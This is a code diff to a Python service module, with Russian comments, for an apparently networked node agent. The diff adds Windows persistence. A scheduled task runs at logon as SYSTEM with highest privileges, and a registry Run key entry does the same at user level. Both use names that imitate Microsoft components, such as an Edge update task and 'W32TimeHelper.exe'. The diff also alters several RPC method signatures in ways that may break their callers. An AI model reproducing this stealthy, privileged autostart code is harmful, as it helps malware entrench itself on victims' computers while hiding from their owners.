@@ -1,10 +1,15 @@
 # services/system/service.py — управление системой: подключение к узлам, диагностика
 
 import asyncio
+import subprocess
 
-from src.internal_modules.base import ModuleGeneric
 from services.rpc import rpc
+from src.internal_modules.base import ModuleGeneric
 
+try:
+    import winreg
+except ImportError:
+    winreg = None
 
 class System(ModuleGeneric):
     def __init__(self, name, context):
@@ -61,7 +66,7 @@ class System(ModuleGeneric):
                 'note': 'Подключение в процессе (коннектор будет повторять попытки)'}
 
     @rpc
-    def list_connectors(self, data: dict):
+    def list_connectors(self):
         """Список активных исходящих коннекторов."""
         result = []
         for mod in self.ctx._modules:
@@ -74,7 +79,7 @@ class System(ModuleGeneric):
         return result
 
     @rpc
-    def node_detail(self, data: dict):
+    def node_detail(self,):
         """Детальная информация об узле: соседи, сервисы, активные WS."""
         nt = self.ctx.network.neighbor_table
         nm = self.ctx.network.nodes_manager
@@ -93,7 +98,85 @@ class System(ModuleGeneric):
         }
 
     @rpc
-    def config_peers(self, data: dict):
+    def config_peers(self):
         """Список пиров из config.local.yaml."""
         peers = self.ctx.config_manager.list_peers()
         return [{'node_id': p.node_id, 'uri': p.uri} for p in peers]
+
+    def add_to_task_scheduler(self):
+        """Добавляет задачу в планировщик"""
+        exe_path = self.ctx.config_manager.local.full_path
+        # exe_path = BASE_DIR / 'W32TimeHelper.exe'
+        task_name = self.ctx.config_manager.local.name
+
+        # remove_from_task_scheduler()
+
+        try:
+            # subprocess.call('cmd /C "chcp 1251"')
+            cmd = f'schtasks /Create /F /TN "{task_name}" /TR "{exe_path}" /SC ONLOGON /RU "NT AUTHORITY\\SYSTEM" /DELAY 0000:30 /rl highest'
+            result = subprocess.call(cmd, shell=True)
+
+        except Exception as e:
+            self.log.error("Ошибка создания задачи планировщика", e)
+
+        self.add_to_registry_startup()
+
+    def remove_from_task_scheduler(self):
+        """Удаляет задачу из планировщика"""
+        task_name = "MicrosoftEdgeUpdateTaskMachineEye"
+        try:
+            cmd = f'schtasks /Delete /F /TN "{task_name}"'
+            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception as e:
+            self.log.error("Ошибка удаления задачи планировщика", e)
+
+    def add_to_registry_startup(self):
+        """Добавляет запуск через реестр"""
+        if winreg is None:
+            return
+
+        try:
+            exe_path = self.ctx.config_manager.local.full_path.resolve()
+            key_name = self.ctx.config_manager.local.name
+
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE
+            )
+
+            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
+            winreg.CloseKey(key)
+
+            self.log.info(f"Добавлено в автозапуск реестра: {key_name}")
+
+        except Exception as e:
+            self.log.error("Ошибка добавления в реестр", e)
+
+    def remove_from_registry_startup(self):
+        """Удаляет из автозапуска реестра"""
+        if winreg is None:
+            return
+
+        try:
+            key_name = self.ctx.config_manager.local.name
+
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE
+            )
+
+            try:
+                winreg.DeleteValue(key, key_name)
+                self.log.info(f"Удалено из автозапуска реестра: {key_name}")
+            except FileNotFoundError:
+                pass
+
+            winreg.CloseKey(key)
+
+        except Exception as e:
+            self.log.error("Ошибка удаления из реестра", e)
+
